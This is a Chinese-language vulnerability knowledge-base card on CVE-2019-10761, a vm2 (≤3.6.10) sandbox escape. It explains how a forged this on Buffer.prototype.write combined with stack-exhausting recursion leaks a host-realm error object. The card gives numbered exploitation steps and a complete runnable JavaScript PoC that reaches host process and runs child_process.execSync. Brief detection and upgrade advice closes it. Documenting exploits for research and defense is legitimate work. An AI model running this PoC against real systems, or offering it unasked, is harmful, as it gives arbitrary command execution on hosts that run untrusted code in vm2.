---
id: binary-pwn-sandbox-escape-vm2-2019-10761-buffer-write-recursion-error
title: vm2 ≤3.6.10 CVE-2019-10761：Buffer.prototype.write 在伪造 this 上触发宿主异常 + 递归栈耗尽取出未隔离的宿主错误对象
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: vm2-buffer-write-host-error-recursion-escape
tags:
- javascript
- nodejs
- vm2
- sandbox-escape
- buffer
- host-error
- recursion
- cross-realm
- child-process
- rce
cve:
- CVE-2019-10761
affected_versions: vm2 <= 3.6.10
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:23:21+08:00'
  notes: 已对照原文核对：原文明确“要求vm2版本<=3.6.10”，PoC(Buffer.prototype.write/伪造this/递归栈耗尽取宿主错误对象/constructor.constructor取process)逐行一致；affected_versions已规范为原文标记vm2 <= 3.6.10；与vm2跨realm综述卡为related非同链；未本机执行。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-vm2-2019-10761-buffer-write-recursion-error/
draft: false
kb_aliases:
- CVE-2019-10761
- vm2 Buffer.prototype.write 逃逸
- Buffer 伪造 this 抛宿主异常
- 递归栈耗尽 vm2
- vm2 3.6.10 逃逸
---

## 一句话结论

vm2 ≤3.6.10 未完整隔离宿主内建对象错误路径上产生的异常对象：沙箱内取出 `Buffer.prototype.write`，用一个带 `length` 和 `utf8Write` 的伪造 `this` 调用它，并借递归/栈耗尽探测出可返回宿主异常的状态，`catch` 到的错误对象的 `constructor.constructor` 仍是宿主 `Function`；执行 `Function('return process')()` 取得宿主 `process`，再经 `process.mainModule.require('child_process').execSync` 执行任意命令。

## 原理

- vm2 通过 Proxy 劫持 `constructor`、`__proto__` 等访问路径，但宿主内建函数（`Buffer.prototype.write`）在类型检查/写失败时抛出的异常对象来自宿主 realm，vm2 没有对该异常对象的 `constructor` 链做代理清洗。
- PoC 先用 `f = Buffer.prototype.write`、`ft = {length: 10, utf8Write(){}}` 准备一个“看起来像 Buffer”的伪造 this；`f.call(ft)` 会走 Node 内部 `Buffer` 的写路径并触发宿主侧异常/行为。
- `r(i)` 先无限递归 `x = r(i)` 直到栈耗尽，捕获宿主 `RangeError` 后逐层返回数字（`x + 1`），把递归深度与返回值逐层传回；当某一层的 `x === i` 时执行 `f.call(ft)`，若抛出错误就 `return e`。
- 外层 `r(i).constructor.constructor('return process')()` 对该错误对象取构造器：由于错误对象没有被 vm2 代理包装，`constructor` 是宿主 `Error`、`constructor.constructor` 是宿主 `Function`，于是 `Function('return process')()` 返回宿主进程对象，`process.mainModule.require('child_process').execSync('whoami')` 执行命令。
- 递归与外层 while 的作用是“尝试不同 i，直到 `f.call(ft)` 真的抛出可带出宿主 realm 的错误对象”；核心漏洞是跨 realm 异常未被隔离，而不是 Buffer 写本身。

## 触发条件

- 目标使用 vm2 ≤3.6.10（CVE-2019-10761 的受影响区间；原文标注 `<=3.6.10`）。
- 沙箱内默认可访问 `Buffer`（vm2 的 VM/NodeVM 默认会注入 Buffer）。
- 攻击者可控沙箱脚本，且脚本能执行递归/循环。
- Node.js 宿主为 CommonJS，`process.mainModule` 可用；否则需要替换取模块的方式。
- 沙箱对执行时间有限制时，递归深度与 while 次数需在超时前命中。

## 利用步骤

1. 确认目标 vm2 版本 ≤3.6.10，且沙箱脚本可控。
2. 取 `Buffer.prototype.write` 作为宿主内建函数引用，构造伪造 `this`（`length` + `utf8Write`）。
3. 用递归函数制造/探测宿主异常对象：递归到栈耗尽、逐层返回数字，在特定层调用 `f.call(ft)` 并返回捕获的错误。
4. 对返回对象执行 `.constructor.constructor('return process')()`，拿到宿主 `process`。
5. `process.mainModule.require('child_process').execSync('whoami').toString()` 执行命令并回显。

## PoC

```javascript
"use strict";
const {VM} = require('vm2');
const untrusted = `
const f = Buffer.prototype.write;
const ft = {
        length: 10,
        utf8Write(){

        }
}
function r(i){
    var x = 0;
    try{
        x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
        return x;
    if(x!==i)
        return x+1;
    try{
        f.call(ft);
    }catch(e){
        return e;
    }
    return null;
}
var i=1;
while(1){
    try{
        i=r(i).constructor.constructor("return process")();
        break;
    }catch(x){
        i++;
    }
}
i.mainModule.require("child_process").execSync("whoami").toString()
`;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

## 变体与关联

- 变体：其它宿主内建对象的错误路径同样可能带出未代理的宿主异常对象；`Error.prepareStackTrace`/`CallSite` 跨 realm 泄露是同一类“宿主错误对象未隔离”问题。
- 关联：[[binary-pwn-sandbox-escape-vm2-cross-realm-implicit-call]] 的综述列出 CVE-2019-10761 `<3.6.11` 并指出“Guest 递归/栈耗尽产生 Host RangeError，异常处理路径泄漏未充分隔离的对象”，但无完整 PoC；本卡给出可直接运行的 PoC。
- 关联：[[binary-pwn-sandbox-escape-vm2-2021-23449-dynamic-import-host-module]] 是同产品不同 CVE 的逃逸面。

## 检测与防御

- 检测：沙箱脚本是否引用 `Buffer.prototype.write`、构造伪造 `this`、执行无限递归；`catch` 后是否对异常对象取 `constructor`。
- 防御：升级 vm2 到 3.6.11 及以上（vm2 作者已停止维护，长期应弃用）；不要把 `Buffer` 等宿主内建直接暴露给不可信脚本；使用独立进程/`isolated-vm` 做隔离，并对沙箱执行设置超时与资源限制。
